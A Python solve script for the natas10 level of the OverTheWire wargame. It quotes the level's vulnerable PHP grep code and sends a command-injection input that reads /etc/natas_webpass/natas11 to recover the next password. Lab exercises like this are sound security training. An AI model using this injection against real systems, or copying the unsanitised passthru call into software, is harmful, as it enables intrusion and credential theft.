import requests
import bs4
import re
import html


# configuration for natas10
USERNAME = 'natas10'
PASSWORD = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'
URL = 'http://natas10.natas.labs.overthewire.org/'
AUTH = requests.auth.HTTPBasicAuth(USERNAME, PASSWORD)


session = requests.Session()
session.auth = AUTH
response = session.get(URL)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.find('div', {'id' : 'content'})
print(f'{div_content}\n')


response = session.get(URL + 'index-source.html')
source = html.unescape(response.text).replace('<br />', '')
div = bs4.BeautifulSoup(source, 'lxml').body.div
print(f'{div}\n')


"""
$key = "";
if(array_key_exists("needle", $_REQUEST)) {    
    $key = $_REQUEST["needle"];
}
if($key != "") {    
    if(preg_match('/[;|&amp;]/',$key)) {        
        print "Input contains an illegal character!";    
    } else {        
        passthru("grep -i $key dictionary.txt");    
    }
}
"""
# if our command contains one of the following: ; | &
# it will print "Input contains an illegal character"
# we can still apply our previous solution for this challenge
# at the end, we can add #, which will comment out dictionary.txt as # was not escaped
data = {
    'needle' : '.* /etc/natas_webpass/natas11 # ',
    'submit' : 'submit'
}
response = session.post(URL, data=data)
div_content = bs4.BeautifulSoup(response.text, 'html.parser').body.div
print(f'{div_content}\n')


password = re.search(r'/etc/natas_webpass/natas11:(\w+)', str(div_content)).group(1)
print(f'natas11 password: {password}')